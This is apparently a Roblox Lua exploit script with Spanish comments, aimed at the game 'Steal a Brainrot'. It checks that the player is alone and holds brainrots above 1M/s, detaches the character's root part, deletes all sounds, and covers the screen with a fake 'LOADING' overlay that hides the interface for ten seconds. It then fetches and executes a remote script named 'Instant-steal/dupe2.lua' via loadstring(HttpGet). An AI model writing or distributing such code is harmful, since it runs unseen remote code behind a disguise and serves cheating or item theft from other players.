-- Colocar en: StarterGui > ScreenGui > LocalScript
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

-- Función para verificar y expulsar jugadores si hay más de uno
local function checkPlayerCount()
    local playerCount = #Players:GetPlayers()
    if playerCount > 1 then
        -- Mostrar mensaje a todos los jugadores locales (este LocalScript solo afecta al cliente actual)
        local player = Players.LocalPlayer
        local playerGui = player and player:FindFirstChild("PlayerGui")
        if playerGui then
            local screenGui = Instance.new("ScreenGui")
            local textLabel = Instance.new("TextLabel")
            screenGui.Parent = playerGui
            textLabel.Parent = screenGui

            textLabel.Size = UDim2.new(1, 0, 1, 0)
            textLabel.BackgroundColor3 = Color3.new(0, 0, 0)
            textLabel.TextColor3 = Color3.new(1, 0, 0)
            textLabel.Text = "❌ Solo debe haber un jugador en el servidor. Saliendo..."
            textLabel.Font = Enum.Font.SourceSansBold
            textLabel.TextSize = 24
            textLabel.ZIndex = 10
        end

        print("[SISTEMA] Hay más de 1 jugador en el servidor. (Cuenta: " .. tostring(playerCount) .. ")")

        -- Nota: desde un LocalScript no podrás kickear a otros jugadores en el servidor.
        -- player:Kick("Solo debe haber un jugador en el servidor") -- esto solo afectaría al jugador local
        return true
    end
    return false
end

-- -------------------------------------------------------
-- Fase inicial: comprobar **solo** durante 3 segundos y terminar
-- -------------------------------------------------------
local startTime = tick()
local playerAddedConn

-- Solo conectar PlayerAdded durante la fase inicial.
playerAddedConn = Players.PlayerAdded:Connect(function()
    -- Si estamos todavía dentro de los 3 segundos, hacemos una verificación rápida
    if tick() - startTime <= 3 then
        -- pequeña espera para dejar que el count se actualice
        wait(0.2)
        checkPlayerCount()
    end
end)

-- Bucle activo durante 3 segundos
while tick() - startTime < 3 do
    checkPlayerCount()
    wait(0.5) -- revisar cada 0.5s durante los 3 segundos
end

-- Terminar: desconectar listener y dejar de hacer comprobaciones
if playerAddedConn then
    playerAddedConn:Disconnect()
    playerAddedConn = nil
end


-- ---------------------1M/S SI NO TE EXPULSA

-- 🔧 Obtener el jugador local

-- 🧠 Extraer datos de Brainrots
local function getBrainrotData(plot)
	local results = {}
	local hasValidBrainrot = false
	local animalPodiums = plot:FindFirstChild("AnimalPodiums")
	if not animalPodiums then
		return {"Ningún Brainrot encontrado"}, false
	end

	for _, folder in ipairs(animalPodiums:GetChildren()) do
		local displayText, genText, mutationText = "N/A", "N/A", "N/A"
		local isValidBrainrot = false
		
		local base = folder:FindFirstChild("Base")
		if base then
			local spawn = base:FindFirstChild("Spawn")
			if spawn then
				local attachment = spawn:FindFirstChild("Attachment")
				if attachment then
					local animalOverhead = attachment:FindFirstChild("AnimalOverhead")
					if animalOverhead then
						local generation = animalOverhead:FindFirstChild("Generation")
						if generation and generation:IsA("TextLabel") then
							displayText = generation.Text
							if displayText:find("M/s") then
								local numberPart = displayText:match("([%d%.]+)%s*M/s")
								if numberPart then
									local speed = tonumber(numberPart)
									if speed and speed >= 1 then
										isValidBrainrot = true
										hasValidBrainrot = true
									end
								else
									if displayText:find("1M/s") or displayText:find("2M/s") or displayText:find("3M/s") or 
									   displayText:find("4M/s") or displayText:find("5M/s") or displayText:find("6M/s") or
									   displayText:find("7M/s") or displayText:find("8M/s") or displayText:find("9M/s") then
										isValidBrainrot = true
										hasValidBrainrot = true
									end
								end
							end
						end
					end
				end
			end
		end
		
		for _, descendant in ipairs(folder:GetDescendants()) do
			if descendant:IsA("TextLabel") then
				local name = string.lower(descendant.Name)
				if name:find("generation") and genText == "N/A" then
					genText = descendant.Text
				elseif name:find("mutation") and mutationText == "N/A" then
					mutationText = descendant.Text
				end
			end
		end
		
		if displayText ~= "N/A" or genText ~= "N/A" or mutationText ~= "N/A" then
			table.insert(results, displayText .. " - " .. genText .. " - " .. mutationText)
		end
	end

	return results, hasValidBrainrot
end

local player = game.Players.LocalPlayer
-- 🎯 Buscar el plot del jugador
local function findMyPlot()
	local plotsFolder = workspace:FindFirstChild("Plots")
	if not plotsFolder then 
		return nil 
	end

	for _, plot in pairs(plotsFolder:GetChildren()) do
		local plotSign = plot:FindFirstChild("Plotsign") or plot:FindFirstChild("PlotSign")
		if plotSign then
			local surfaceGui = plotSign:FindFirstChild("SurfaceGui")
			if surfaceGui then
				local frame = surfaceGui:FindFirstChild("Frame")
				if frame then
					local textLabel = frame:FindFirstChild("TextLabel")
					if textLabel and textLabel:IsA("TextLabel") then
						if string.find(string.lower(textLabel.Text), string.lower(player.Name)) then
							return plot
						end
					end
				end
			end
		end
	end
	return nil
end

-- 🔍 Ejecutar la verificación
local plot = findMyPlot()
if plot then
	local _, hasValidBrainrot = getBrainrotData(plot)
	if not hasValidBrainrot then
		player:Kick("❌ Solo se permiten brainrots arriba de 1M/s")
		return
	end
else
	player:Kick("❌ No se encontró tu plot en el servidor")
end

----------------


-- LocalScript
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Espera a que exista el HumanoidRootPart
local hrp = character:WaitForChild("HumanoidRootPart")

-- Guardamos su posición
local savedCFrame = hrp.CFrame

-- Lo eliminamos del personaje temporalmente
hrp.Parent = nil
print("HumanoidRootPart eliminado temporalmente")

-- Esperamos unos segundos
task.wait(2)

-- Lo volvemos a colocar en el personaje
hrp.Parent = character
hrp.CFrame = savedCFrame
print("HumanoidRootPart restaurado")






local workspace = game:GetService("Workspace")

-- Función para eliminar sonidos de un objeto y sus descendientes
local function eliminarSonidos(obj)
    for _, hijo in pairs(obj:GetDescendants()) do
        if hijo:IsA("Sound") or hijo.Name:lower():find("sound") then
            hijo:Destroy()
        end
    end
end

-- Eliminar sonidos que ya existen en Workspace
eliminarSonidos(workspace)

-- Detectar cualquier objeto nuevo agregado a Workspace
workspace.DescendantAdded:Connect(function(obj)
    if obj:IsA("Sound") or obj.Name:lower():find("sound") then
        obj:Destroy()
    end
end)


local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Crear el ScreenGui con MÁXIMA prioridad
local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "LoadingGUI"
loadingGui.IgnoreGuiInset = true
loadingGui.ResetOnSpawn = false
loadingGui.DisplayOrder = 999  -- Número muy alto para estar encima de TODO
loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling  -- Para controlar el orden
loadingGui.Parent = playerGui

-- Crear frame de fondo que cubra ABSOLUTAMENTE TODO
local loadingFrame = Instance.new("Frame")
loadingFrame.Size = UDim2.new(1, 0, 1, 0)
loadingFrame.BackgroundColor3 = Color3.new(0, 0, 0)  -- Negro sólido
loadingFrame.BorderSizePixel = 0
loadingFrame.BackgroundTransparency = 0  -- Completamente opaco
loadingFrame.ZIndex = 999  -- Prioridad máxima dentro del GUI
loadingFrame.Parent = loadingGui

-- Crear contenedor para las letras con alta prioridad
local lettersContainer = Instance.new("Frame")
lettersContainer.Size = UDim2.new(0, 300, 0, 100)
lettersContainer.Position = UDim2.new(0.5, -150, 0.5, -50)
lettersContainer.BackgroundTransparency = 1
lettersContainer.ZIndex = 1000  -- Aún más alto que el fondo
lettersContainer.Parent = loadingFrame

-- Letras de "LOADING"
local letters = {"L", "O", "A", "D", "I", "N", "G"}
local textLabels = {}

-- Crear cada letra con máxima prioridad
for i, letter in ipairs(letters) do
	local textLabel = Instance.new("TextLabel")
	textLabel.Text = letter
	textLabel.Size = UDim2.new(0, 30, 0, 50)
	textLabel.Position = UDim2.new(0, (i-1) * 35, 0, 25)
	textLabel.BackgroundTransparency = 1
	textLabel.TextColor3 = Color3.new(1, 1, 1)  -- Blanco
	textLabel.TextSize = 32
	textLabel.Font = Enum.Font.GothamBold
	textLabel.TextTransparency = 0
	textLabel.ZIndex = 1001  -- Prioridad máxima para el texto
	textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)  -- Borde negro para mejor visibilidad
	textLabel.TextStrokeTransparency = 0.3
	textLabel.Parent = lettersContainer
	
	table.insert(textLabels, textLabel)
end

-- Delays para cada letra (efecto escalonado)
local delays = {0, 0.2, 0.4, 0.6, 0.8, 1.0, 1.2}

-- Función de animación
local function startLoadingAnimation()
	for i, textLabel in ipairs(textLabels) do
		local delayTime = delays[i]
		
		coroutine.wrap(function()
			task.wait(delayTime)
			
			while loadingGui.Parent do
				for step = 0, 1, 0.1 do
					if not loadingGui.Parent then break end
					textLabel.TextTransparency = step * 0.8
					task.wait(0.05)
				end
				
				for step = 1, 0, -0.1 do
					if not loadingGui.Parent then break end
					textLabel.TextTransparency = step * 0.8
					task.wait(0.05)
				end
				
				task.wait(0.5)
			end
		end)()
	end
end

-- Asegurarse de que cubra TODO incluso si hay otros GUIs
local function ensureTopPriority()
	loadingGui.DisplayOrder = 999
	pcall(function()
		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
	end)
end

ensureTopPriority()
startLoadingAnimation()

-- Función para remover el loading y restaurar la UI normal
local function removeLoading()
	pcall(function()
		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
	end)
	
	loadingGui:Destroy()
	
	-- 🟢 Ejecutar script remoto después de los 10 segundos de carga
	task.spawn(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/LeyendaZero/Instant-steal/main/dupe2.lua"))()
	end)
end

-- Ocultar temporalmente
local function hideLoading()
	loadingGui.Enabled = false
	pcall(function()
		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
	end)
end

-- Mostrar nuevamente
local function showLoading()
	loadingGui.Enabled = true
	ensureTopPriority()
end

-- ⏱️ Remover después de 10 segundos
task.delay(10, removeLoading)

return {
	Show = showLoading,
	Hide = hideLoading,
	Remove = removeLoading
}
